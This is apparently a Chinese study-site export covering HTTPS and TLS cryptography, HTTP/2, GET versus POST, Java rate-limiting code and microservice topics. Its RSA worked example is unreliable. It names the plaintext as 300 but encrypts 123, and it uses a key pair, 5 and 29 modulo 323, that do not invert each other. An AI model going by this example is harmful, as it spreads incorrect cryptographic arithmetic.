不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。  HTTPS 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信，也就是说 HTTPS 使用了隧道进行通信。\n通过使用 SSL，HTTPS 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。\n\n加密    1. 对称密钥加密    对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。\n 优点：运算速度快； 缺点：无法安全地将密钥传输给通信方。  \n2.非对称密钥加密    非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。\n公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。\n非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。\n 优点：可以更安全地将公开密钥传输给通信发送方； 缺点：运算速度慢。  \n3. HTTPS 采用的加密方式    上面提到对称密钥加密方式的传输效率更高，但是无法安全地将密钥 Secret Key 传输给通信方。而非对称密钥加密方式可以保证传输的安全性，因此我们可以利用非对称密钥加密方式将 Secret Key 传输给通信方。HTTPS 采用混合的加密机制，正是利用了上面提到的方案：\n 使用非对称密钥加密方式，传输对称密钥加密方式所需要的 Secret Key，从而保证安全性; 获取到 Secret Key 后，再使用对称密钥加密方式进行通信，从而保证效率。（下图中的 Session Key 就是 Secret Key）  \n认证    通过使用 证书 来对通信方进行认证。\n数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。\n服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。\n进行 HTTPS 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。\n\n完整性保护    SSL 提供报文摘要功能来进行完整性保护。\nHTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。\nHTTPS 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。\nHTTPS 的缺点     因为需要进行加密解密等过程，因此速度会更慢； 需要支付证书授权的高额费用。  七、HTTP/2.0    HTTP/1.x 缺陷    HTTP/1.x 实现简单是以牺牲性能为代价的：\n 客户端需要使用多个连接才能实现并发和缩短延迟； 不会压缩请求和响应首部，从而导致不必要的网络流量； 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。  二进制分帧层    HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。\n\n在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。\n 一个数据流（Stream）都有一个唯一标识符和可选的优先级信息，用于承载双向信息。 消息（Message）是与逻辑请求或响应对应的完整的一系列帧。 帧（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。  \n服务端推送    HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。\n\n首部压缩    HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。\nHTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。\n不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。\n\n八、HTTP/1.1 新特性    详细内容请见上文\n 默认是长连接 支持流水线 支持同时打开多个 TCP 连接 支持虚拟主机 新增状态码 100 支持分块传输编码 新增缓存处理指令 max-age  九、GET 和 POST 比较    作用    GET 用于获取资源，而 POST 用于传输实体主体。\n参数    GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。\n因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码。例如 中文 会转换为 %E4%B8%AD%E6%96%87，而空格会转换为 %20。POST 参数支持标准字符集。\nGET /test/demo_form.asp?name1=value1\u0026amp;name2=value2 HTTP/1.1 POST /test/demo_form.asp HTTP/1.1 Host: w3schools.com name1=value1\u0026amp;name2=value2 安全    安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。\nGET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。\n安全的方法除了 GET 之外还有：HEAD、OPTIONS。\n不安全的方法除了 POST 之外还有 PUT、DELETE。\n幂等性    幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。\n所有的安全方法也都是幂等的。\n在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。\nGET /pageX HTTP/1.1 是幂等的，连续调用多次，客户端接收到的结果都是一样的：\nGET /pageX HTTP/1.1 GET /pageX HTTP/1.1 GET /pageX HTTP/1.1 GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的，如果调用多次，就会增加多行记录：\nPOST /add_row HTTP/1.1 -\u0026gt; Adds a 1nd row POST /add_row HTTP/1.1 -\u0026gt; Adds a 2nd row POST /add_row HTTP/1.1 -\u0026gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即使不同的请求接收到的状态码不一样：\nDELETE /idX/delete HTTP/1.1 -\u0026gt; Returns 200 if idX exists DELETE /idX/delete HTTP/1.1 -\u0026gt; Returns 404 as it just got deleted DELETE /idX/delete HTTP/1.1 -\u0026gt; Returns 404 可缓存    如果要对响应进行缓存，需要满足以下条件：\n 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。  XMLHttpRequest    为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest：\n XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。\n  在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。 而 GET 方法 Header 和 Data 会一起发送。  参考资料     上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014. MDN : HTTP HTTP/2 简介 htmlspecialchars Difference between file URI and URL in java How to Fix SQL Injection Using Java PreparedStatement \u0026amp; CallableStatement 浅谈 HTTP 中 Get 与 Post 的区别 Are http:// and www really necessary? HTTP (HyperText Transfer Protocol) Web-VPN: Secure Proxies with SPDY \u0026amp; Chrome File:HTTP persistent connection.svg Proxy server What Is This HTTPS/SSL Thing And Why Should You Care? What is SSL Offloading? Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption An Introduction to Mutual SSL Authentication The Difference Between URLs and URIs Cookie 与 Session 的区别 COOKIE 和 SESSION 有什么区别 Cookie/Session 的机制与安全 HTTPS 证书原理 What is the difference between a URI, a URL and a URN? XMLHttpRequest XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST? Symmetric vs. Asymmetric Encryption – What are differences? Web 性能优化与 HTTP/2 HTTP/2 简介  "},{"id":192,"href":"/cs-basics/network/HTTPS%E4%B8%AD%E7%9A%84TLS/","title":"HTTPS中的TLS","parent":"network","content":" 1. SSL 与 TLS 2. 从网络协议的角度理解 HTTPS 3. 从密码学的角度理解 HTTPS  3.1. TLS 工作流程 3.2. 密码基础  3.2.1. 伪随机数生成器 3.2.2. 消息认证码 3.2.3. 数字签名 3.2.4. 公钥密码 3.2.5. 证书 3.2.6. 密码小结   3.3. TLS 使用的密码技术 3.4. TLS 总结   4. RSA 简单示例 5. 参考  1. SSL 与 TLS    SSL：（Secure Socket Layer） 安全套接层，于 1994 年由网景公司设计，并于 1995 年发布了 3.0 版本\nTLS：（Transport Layer Security）传输层安全性协议，是 IETF 在 SSL3.0 的基础上设计的协议\n以下全部使用 TLS 来表示\n2. 从网络协议的角度理解 HTTPS    HTTP：HyperText Transfer Protocol 超文本传输协议\nHTTPS：Hypertext Transfer Protocol Secure 超文本传输安全协议\nTLS：位于 HTTP 和 TCP 之间的协议，其内部有 TLS握手协议、TLS记录协议\nHTTPS 经由 HTTP 进行通信，但利用 TLS 来保证安全，即 HTTPS = HTTP + TLS\n3. 从密码学的角度理解 HTTPS    HTTPS 使用 TLS 保证安全，这里的“安全”分两部分，一是传输内容加密、二是服务端的身份认证\n3.1. TLS 工作流程    此为服务端单向认证，还有客户端/服务端双向认证，流程类似，只不过客户端也有自己的证书，并发送给服务器进行验证\n3.2. 密码基础    3.2.1. 伪随机数生成器    为什么叫伪随机数，因为没有真正意义上的随机数，具体可以参考 Random/TheadLocalRandom\n它的主要作用在于生成对称密码的秘钥、用于公钥密码生成秘钥对\n3.2.2. 消息认证码    消息认证码主要用于验证消息的完整性与消息的认证，其中消息的认证指“消息来自正确的发送者”\n 消息认证码用于验证和认证，而不是加密\n  发送者与接收者事先共享秘钥 发送者根据发送消息计算 MAC 值 发送者发送消息和 MAC 值 接收者根据接收到的消息计算 MAC 值 接收者根据自己计算的 MAC 值与收到的 MAC 对比 如果对比成功，说明消息完整，并来自于正确的发送者  3.2.3. 数字签名    消息认证码的缺点在于无法防止否认，因为共享秘钥被 client、server 两端拥有，server 可以伪造 client 发送给自己的消息（自己给自己发送消息），为了解决这个问题，我们需要它们有各自的秘钥不被第二个知晓（这样也解决了共享秘钥的配送问题）\n 数字签名和消息认证码都不是为了加密\n可以将单向散列函数获取散列值的过程理解为使用 md5 摘要算法获取摘要的过程\n 使用自己的私钥对自己所认可的消息生成一个该消息专属的签名，这就是数字签名，表明我承认该消息来自自己\n注意：私钥用于加签，公钥用于解签，每个人都可以解签，查看消息的归属人\n3.2.4. 公钥密码    公钥密码也叫非对称密码，由公钥和私钥组成，它最开始是为了解决秘钥的配送传输安全问题，即，我们不配送私钥，只配送公钥，私钥由本人保管 它与数字签名相反，公钥密码的私钥用于解密、公钥用于加密，每个人都可以用别人的公钥加密，但只有对应的私钥才能解开密文\nclient：明文 + 公钥 = 密文\nserver：密文 + 私钥 = 明文\n注意：公钥用于加密，私钥用于解密，只有私钥的归属者，才能查看消息的真正内容\n3.2.5. 证书    证书：全称公钥证书（Public-Key Certificate, PKC）,里面保存着归属者的基本信息，以及证书过期时间、归属者的公钥，并由认证机构（Certification Authority, CA）施加数字签名，表明，某个认证机构认定该公钥的确属于此人\n 想象这个场景：你想在支付宝页面交易，你需要支付宝的公钥进行加密通信，于是你从百度上搜索关键字“支付宝公钥”，你获得了支什宝的公钥，这个时候，支什宝通过中间人攻击，让你访问到了他们支什宝的页面，最后你在这个支什宝页面完美的使用了支什宝的公钥完成了与支什宝的交易  在上面的场景中，你可以理解支付宝证书就是由支付宝的公钥、和给支付宝颁发证书的企业的数字签名组成\n任何人都可以给自己或别人的公钥添加自己的数字签名，表明：我拿我的尊严担保，我的公钥/别人的公钥是真的，至于信不信那是另一回事了\n3.2.6. 密码小结       密码 作用 组成     消息认证码 确认消息的完整、并对消息的来源认证 共享秘钥+消息的散列值   数字签名 对消息的散列值签名 公钥+私钥+消息的散列值   公钥密码 解决秘钥的配送问题 公钥+私钥+消息   证书 解决公钥的归属问题 公钥密码中的公钥+数字签名    3.3. TLS 使用的密码技术     伪随机数生成器：秘钥生成随机性，更难被猜测 对称密码：对称密码使用的秘钥就是由伪随机数生成，相较于非对称密码，效率更高 消息认证码：保证消息信息的完整性、以及验证消息信息的来源 公钥密码：证书技术使用的就是公钥密码 数字签名：验证证书的签名，确定由真实的某个 CA 颁发 证书：解决公钥的真实归属问题，降低中间人攻击概率  3.4. TLS 总结    TLS 是一系列密码工具的框架，作为框架，它也是非常的灵活，体现在每个工具套件它都可以替换，即：客户端与服务端之间协商密码套件，从而更难的被攻破，例如使用不同方式的对称密码，或者公钥密码、数字签名生成方式、单向散列函数技术的替换等\n4. RSA 简单示例    RSA 是一种公钥密码算法，我们简单的走一遍它的加密解密过程\n加密算法：密文 = (明文^E) mod N，其中公钥为{E,N}，即”求明文的E次方的对 N 的余数“\n解密算法：明文 = (密文^D) mod N，其中秘钥为{D,N}，即”求密文的D次方的对 N 的余数“\n例：我们已知公钥为{5,323}，私钥为{29,323}，明文为300，请写出加密和解密的过程：\n 加密：密文 = 123 ^ 5 mod 323 = 225\n解密：明文 = 225 ^ 29 mod 323 = [[(225 ^ 5) mod 323] * [(225 ^ 5) mod 323] * [(225 ^ 5) mod 323] * [(225 ^ 5) mod 323] * [(225 ^ 5) mod 323] * [(225 ^ 4) mod 323]] mod 323 = (4 * 4 * 4 * 4 * 4 * 290) mod 323 = 123\n 5. 参考     SSL加密发生在哪里：https://security.stackexchange.com/questions/19681/where-does-ssl-encryption-take-place TLS工作流程：https://blog.csdn.net/ustccw/article/details/76691248 《图解密码技术》：https://book.douban.com/subject/26822106/ 豆瓣评分 9.5  "},{"id":193,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/huifer-how-to-limit-current/","title":"huifer-how-to-limit-current","parent":"高并发","content":"如何限流？在工作中是怎么做的？说一下具体的实现？     Author: HuiFer Description: 该文简单介绍限流相关技术以及实现  什么是限流     限流可以认为服务降级的一种，限流就是限制系统的输入和输出流量已达到保护系统的目的。一般来说系统的吞吐量是可以被测算的，为了保证系统的稳定运行，一旦达到的需要限制的阈值，就需要限制流量并采取一些措施以完成限制流量的目的。比如：延迟处理，拒绝处理，或者部分拒绝处理等等。\n 限流方法    计数器    实现方式    控制单位时间内的请求数量。\nimport java.util.concurrent.atomic.AtomicInteger; public class Counter { /** * 最大访问数量 */ private final int limit = 10; /** * 访问时间差 */ private final long timeout = 1000; /** * 请求时间 */ private long time; /** * 当前计数器 */ private AtomicInteger reqCount = new AtomicInteger(0); public boolean limit() { long now = System.currentTimeMillis(); if (now \u0026lt; time + timeout) { // 单位时间内  reqCount.addAndGet(1); return reqCount.get() \u0026lt;= limit; } else { // 超出单位时间  time = now; reqCount = new AtomicInteger(0); return true; } } } 劣势：\n假设在 00:01 时发生一个请求，在 00:01-00:58 之间不在发送请求，在 00:59 时发送剩下的所有请求 n-1 (n 为限流请求数量)，在下一分钟的 00:01 发送 n 个请求，这样在 2 秒钟内请求到达了 2n - 1 个。\n设每分钟请求数量为 60 个，每秒可以处理 1 个请求，用户在 00:59 发送 60 个请求，在 01:00 发送 60 个请求 此时 2 秒钟有 120 个请求(每秒 60 个请求)，远远大于了每秒钟处理数量的阈值。\n滑动窗口    实现方式    滑动窗口是对计数器方式的改进，增加一个时间粒度的度量单位，把一分钟分成若干等分(6 份，每份 10 秒)，在每一份上设置独立计数器，在 00:00-00:09 之间发生请求计数器累加 1。当等分数量越大限流统计就越详细。\npackage com.example.demo1.service; import java.util.Iterator; import java.util.Random; import java.util.concurrent.ConcurrentLinkedQueue; import java.util.stream.IntStream; public class TimeWindow { private ConcurrentLinkedQueue\u0026lt;Long\u0026gt; queue = new ConcurrentLinkedQueue\u0026lt;Long\u0026gt;(); /** * 间隔秒数 */ private int seconds; /** * 最大限流 */ private int max; public TimeWindow(int max， int seconds) { this.seconds = seconds; this.max = max; /** * 永续线程执行清理queue 任务 */ new Thread(() -\u0026gt; { while (true) { try { // 等待 间隔秒数-1 执行清理操作  Thread.sleep((seconds - 1) * 1000L); } catch (InterruptedException e) { e.printStackTrace(); } clean(); } }).start(); } public static void main(String[] args) throws Exception { final TimeWindow timeWindow = new TimeWindow(10， 1); // 测试3个线程  IntStream.range(0， 3).forEach((i) -\u0026gt; { new Thread(() -\u0026gt; { while (true) { try { Thread.sleep(new Random().nextInt(20) * 100); } catch (InterruptedException e) { e.printStackTrace(); } timeWindow.take(); } }).start(); }); } /** * 获取令牌，并且添加时间 */ public void take() { long start = System.currentTimeMillis(); try { int size = sizeOfValid(); if (size \u0026gt; max) { System.err.println(\u0026#34;超限\u0026#34;); } synchronized (queue) { if (sizeOfValid() \u0026gt; max) { System.err.println(\u0026#34;超限\u0026#34;); System.err.println(\u0026#34;queue中有 \u0026#34; + queue.size() + \u0026#34; 最大数量 \u0026#34; + max); } this.queue.offer(System.currentTimeMillis()); } System.out.println(\u0026#34;queue中有 \u0026#34; + queue.size() + \u0026#34; 最大数量 \u0026#34; + max); } } public int sizeOfValid() { Iterator\u0026lt;Long\u0026gt; it = queue.iterator(); Long ms = System.currentTimeMillis() - seconds * 1000; int count = 0; while (it.hasNext()) { long t = it.next(); if (t \u0026gt; ms) { // 在当前的统计时间范围内  count++; } } return count; } /** * 清理过期的时间 */ public void clean() { Long c = System.currentTimeMillis() - seconds * 1000; Long tl = null; while ((tl = queue.peek()) != null \u0026amp;\u0026amp; tl \u0026lt; c) { System.out.println(\u0026#34;清理数据\u0026#34;); queue.poll(); } } } Leaky Bucket 漏桶    实现方式    规定固定容量的桶，有水进入，有水流出。对于流进的水我们无法估计进来的数量、速度，对于流出的水我们可以控制速度。\npublic class LeakBucket { /** * 时间 */ private long time; /** * 总量 */ private Double total; /** * 水流出去的速度 */ private Double rate; /** * 当前总量 */ private Double nowSize; public boolean limit() { long now = System.currentTimeMillis(); nowSize = Math.max(0， (nowSize - (now - time) * rate)); time = now; if ((nowSize + 1) \u0026lt; total) { nowSize++; return true; } else { return false; } } } Token Bucket 令牌桶    实现方式    规定固定容量的桶， token 以固定速度往桶内填充， 当桶满时 token 不会被继续放入， 每过来一个请求把 token 从桶中移除， 如果桶中没有 token 不能请求。\npublic class TokenBucket { /** * 时间 */ private long time; /** * 总量 */ private Double total; /** * token 放入速度 */ private Double rate; /** * 当前总量 */ private Double nowSize; public boolean limit() { long now = System.currentTimeMillis(); nowSize = Math.min(total， nowSize + (now - time) * rate); time = now; if (nowSize \u0026lt; 1) { // 桶里没有token  return false; } else { // 存在token  nowSize -= 1; return true; } } } 工作中的使用    spring cloud gateway     spring cloud gateway 默认使用 redis 进行限流，笔者一般只是修改修改参数属于拿来即用，并没有去从头实现上述那些算法。  \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-gateway\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-redis-reactive\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; spring:cloud:gateway:routes:- id:requestratelimiter_routeuri:lb://pigx-upmsorder:10000predicates:- Path=/admin/**filters:- name:RequestRateLimiterargs:redis-rate-limiter.replenishRate:1# 令牌桶的容积redis-rate-limiter.burstCapacity:3# 流速 每秒key-resolver:\u0026#34;#{@remoteAddrKeyResolver}\u0026#34;#SPEL表达式去的对应的bean- StripPrefix=1@Bean KeyResolver remoteAddrKeyResolver() { return exchange -\u0026gt; Mono.just(exchange.getRequest().getRemoteAddress().getHostName()); } sentinel     通过配置来控制每个 url 的流量  \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-sentinel\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; spring:cloud:nacos:discovery:server-addr:localhost:8848sentinel:transport:dashboard:localhost:8080port:8720datasource:ds:nacos:server-addr:localhost:8848dataId:spring-cloud-sentinel-nacosgroupId:DEFAULT_GROUPrule-type:flownamespace:xxxxxxxx 配置内容在 nacos 上进行编辑  [ { \u0026#34;resource\u0026#34;: \u0026#34;/hello\u0026#34;， \u0026#34;limitApp\u0026#34;: \u0026#34;default\u0026#34;， \u0026#34;grade\u0026#34;: 1， \u0026#34;count\u0026#34;: 1， \u0026#34;strategy\u0026#34;: 0， \u0026#34;controlBehavior\u0026#34;: 0， \u0026#34;clusterMode\u0026#34;: false } ]  resource：资源名，即限流规则的作用对象。 limitApp：流控针对的调用来源，若为 default 则不区分调用来源。 grade：限流阈值类型，QPS 或线程数模式，0 代表根据并发数量来限流，1 代表根据 QPS 来进行流量控制。 count：限流阈值 strategy：判断的根据是资源自身，还是根据其它关联资源 (refResource)，还是根据链路入口 controlBehavior：流控效果（直接拒绝 / 排队等待 / 慢启动模式） clusterMode：是否为集群模式  总结     sentinel 和 spring cloud gateway 两个框架都是很好的限流框架， 但是在我使用中还没有将spring-cloud-alibaba接入到项目中进行使用， 所以我会选择spring cloud gateway， 当接入完整的或者接入 Nacos 项目使用 setinel 会有更加好的体验.\n "},{"id":194,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/huifer-micro-service-governance/","title":"huifer-micro-service-governance","parent":"微软服务","content":"微服务治理策略     Author：HuiFer Description：该文简单介绍微服务的治理策略以及应用技术  服务的注册和发现    解决问题：集中管理服务\n解决方法：\n Eureka Zookeeper  负载均衡    解决问题：降低服务器硬件压力\n解决方法：\n Nginx Ribbon  通讯    解决问题：各个服务之间的沟通桥梁\n解决方法：\n REST（同步） RPC（同步） MQ（异步）  配置管理    解决问题：随着服务的增加配置也在增加，如何管理各个服务的配置。\n解决方法：\n Nacos Spring Cloud Config Apollo  容错和服务降级    解决问题：在微服务当中，一个请求经常会涉及到调用几个服务，如果其中某个服务不可以，没有做服务容错的话，极有可能会造成一连串的服务不可用，这就是雪崩效应。\n解决方法：\n Hystrix  服务依赖关系    解决问题：多个服务之间来回依赖，启动关系的不明确。\n解决方法：应用分层。\n服务文档    解决问题：降低沟通成本\n解决方法：\n Swagger Java doc  服务安全问题    解决问题：敏感数据的安全性\n解决方法：\n Oauth Shiro Spring Security  流量控制    解决问题：避免一个服务上的流量过大拖垮整个服务体系\n解决方法：\n Hystrix  自动化测试    解决问题：提前预知异常，确定服务是否可用\n解决方法：\n junit  服务上线，下线的流程    解决问题：避免服务随意的上线下线\n解决方法：新服务上线需要经过管理人员审核，服务下线需要告知各个调用方进行修改，直到没有调用该服务才可以进行下线。\n兼容性    解决问题：服务开发持续进行如何做到兼容。\n解决方法：通过版本号的形式进行管理，修改完成进行回归测试。\n服务编排    解决问题：解决服务依赖问题的一种方式\n解决方法：\n Docker K8s  资源调度    解决问题：每个服务的资源占用量不同，如何分配\n解决方法：\n JVM 隔离 Classload 隔离 硬件隔离  容量规划    解决问题：随着时间增长，调用逐步增加，什么时候追加机器。\n解决方法：统计每日调用量和响应时间，根据机器情况设置阈值，超过阈值就可以追加机器。\n"},{"id":195,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/huifer-micro-services-technology-stack/","title":"huifer-micro-services-technology-stack","parent":"微软服务","content":"微服务技术栈     Author: HuiFer Description: 该文简单介绍微服务技术栈有哪些分别用来做什么。  技术栈    微服务开发    作用：快速开发服务。\n Spring Spring MVC Spring Boot  Spring 目前是 JavaWeb 开发人员必不可少的一个框架，SpringBoot 简化了 Spring 开发的配置目前也是业内主流开发框架。\n微服务注册发现    作用：发现服务，注册服务，集中管理服务。\nEureka     Eureka Server : 提供服务注册服务, 各个节点启动后，会在 Eureka Server 中进行注册。 Eureka Client : 简化与 Eureka Server 的交互操作。 Spring Cloud Netflix : GitHub，文档  Zookeeper     ZooKeeper is a centralized service for maintaining configuration information, naming, providing distributed synchronization, and providing group services.\n Zookeeper 是一个集中的服务, 用于维护配置信息、命名、提供分布式同步和提供组服务。\nZookeeper 和 Eureka 区别    Zookeeper 保证 CP，Eureka 保证 AP：\n C：数据一致性； A：服务可用性； P：服务对网络分区故障的容错性，这三个特性在任何分布式系统中不能同时满足，最多同时满足两个。  微服务配置管理    作用：统一管理一个或多个服务的配置信息, 集中管理。\nDisconf    Distributed Configuration Management Platform(分布式配置管理平台) , 它是专注于各种分布式系统配置管理 的通用组件/通用平台, 提供统一的配置管理服务, 是一套完整的基于 zookeeper 的分布式配置统一解决方案。\nSpringCloudConfig    Apollo    Apollo（阿波罗）是携程框架部门研发的分布式配置中心，能够集中化管理应用不同环境、不同集群的配置，配置修改后能够实时推送到应用端，并且具备规范的权限、流程治理等特性，用于微服务配置管理场景。\n权限认证    作用：根据系统设置的安全规则或者安全策略, 用户可以访问而且只能访问自己被授权的资源，不多不少。\nSpring Security    Apache Shiro     Apache Shiro™ is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiro’s easy-to-understand API, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.\n 批处理    作用: 批量处理同类型数据或事物\nSpring Batch    定时任务     作用: 定时做什么。\n Quartz    微服务调用 (协议)     通讯协议\n Rest     通过 HTTP/HTTPS 发送 Rest 请求进行数据交互  RPC     Remote Procedure Call 它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。RPC 不依赖于具体的网络传输协议，tcp、udp 等都可以。  gRPC     A high-performance, open-source universal RPC framework\n 所谓 RPC(remote procedure call 远程过程调用) 框架实际是提供了一套机制，使得应用程序之间可以进行通信，而且也遵从 server/client 模型。使用的时候客户端调用 server 端提供的接口就像是调用本地的函数一样。\nRMI     Remote Method Invocation 纯 Java 调用  服务接口调用     作用：多个服务之间的通讯\n Feign(HTTP)    Spring Cloud Netflix 的微服务都是以 HTTP 接口的形式暴露的，所以可以用 Apache 的 HttpClient 或 Spring 的 RestTemplate 去调用，而 Feign 是一个使用起来更加方便的 HTTP 客戶端，使用起来就像是调用自身工程的方法，而感觉不到是调用远程方法。\n服务熔断     作用: 当请求到达一定阈值时不让请求继续.\n Hystrix     Hystrix is a latency and fault tolerance library designed to isolate points of access to remote systems, services and 3rd party libraries, stop cascading failure and enable resilience in complex distributed systems where failure is inevitable.\n Sentinel     A lightweight powerful flow control component enabling reliability and monitoring for microservices. (轻量级的流量控制、熔断降级 Java 库)\n 服务的负载均衡     作用：降低服务压力, 增加吞吐量\n Ribbon     Spring Cloud Ribbon 是一个基于 HTTP 和 TCP 的客户端负载均衡工具, 它基于 Netflix Ribbon 实现\n Nginx    Nginx (engine x) 是一个高性能的 HTTP 和反向代理 web 服务器, 同时也提供了 IMAP/POP3/SMTP 服务\nNginx 与 Ribbon 区别    Nginx 属于服务端负载均衡，Ribbon 属于客户端负载均衡。Nginx 作用与 Tomcat，Ribbon 作用与各个服务之间的调用 (RPC)。\n消息队列     作用: 解耦业务, 异步化处理数据\n Kafka    RabbitMQ    RocketMQ    activeMQ    日志采集 (elk)     作用: 收集各服务日志提供日志分析、用户画像等\n Elasticsearch    Logstash    Kibana    API 网关     作用: 外部请求通过 API 网关进行拦截处理, 再转发到真正的服务\n Zuul     Zuul is a gateway service that provides dynamic routing, monitoring, resiliency, security, and more.\n 服务监控     作用: 以可视化或非可视化的形式展示出各个服务的运行情况 (CPU、内存、访问量等)\n Zabbix    Nagios    Metrics    服务链路追踪     作用: 明确服务之间的调用关系\n Zipkin    Brave    数据存储     作用: 存储数据\n 关系型数据库    MySql    Oracle    MsSQL    PostgreSql    非关系型数据库    Mongodb    Elasticsearch    缓存     作用: 存储数据\n redis    分库分表     作用: 数据库分库分表方案.\n ShardingSphere    Mycat    服务部署     作用: 将项目快速部署、上线、持续集成.\n Docker    Jenkins    Kubernetes(K8s)    Mesos    "},{"id":196,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/huifer-whats-microservice-how-to-communicate/","title":"huifer-whats-microservice-how-to-communicate","parent":"微软服务","content":"什么是微服务？微服务之间是如何独立通讯的？     Author：HuiFer Description：介绍微服务的定义以及服务间的通信。  什么是微服务     微服务架构是一个分布式系统，按照业务进行划分成为不同的服务单元，解决单体系统性能等不足。 微服务是一种架构风格，一个大型软件应用由多个服务单元组成。系统中的服务单元可以单独部署，各个服务单元之间是松耦合的。   微服务概念起源：Microservices\n 微服务之间是如何独立通讯的    同步    REST HTTP 协议    REST 请求在微服务中是最为常用的一种通讯方式，它依赖于 HTTP\\HTTPS 协议。RESTFUL 的特点是：\n 每一个 URI 代表 1 种资源 客户端使用 GET、POST、PUT、DELETE 4 个表示操作方式的动词对服务端资源进行操作：GET 用来获取资源，POST 用来新建资源（也可以用于更新资源），PUT 用来更新资源，DELETE 用来删除资源 通过操作资源的表现形式来操作资源 资源的表现形式是 XML 或者 HTML 客户端与服务端之间的交互在请求之间是无状态的,从客户端到服务端的每个请求都必须包含理解请求所必需的信息  举个例子，有一个服务方提供了如下接口：\n@RestController @RequestMapping(\u0026#34;/communication\u0026#34;) public class RestControllerDemo { @GetMapping(\u0026#34;/hello\u0026#34;) public String s() { return \u0026#34;hello\u0026#34;; } } 另外一个服务需要去调用该接口，调用方只需要根据 API 文档发送请求即可获取返回结果。\n@RestController @RequestMapping(\u0026#34;/demo\u0026#34;) public class RestDemo{ @Autowired RestTemplate restTemplate; @GetMapping(\u0026#34;/hello2\u0026#34;) public String s2() { String forObject = restTemplate.getForObject(\u0026#34;http://localhost:9013/communication/hello\u0026#34;, String.class); return forObject; } } 通过这样的方式可以实现服务之间的通讯。\nRPC TCP 协议    RPC(Remote 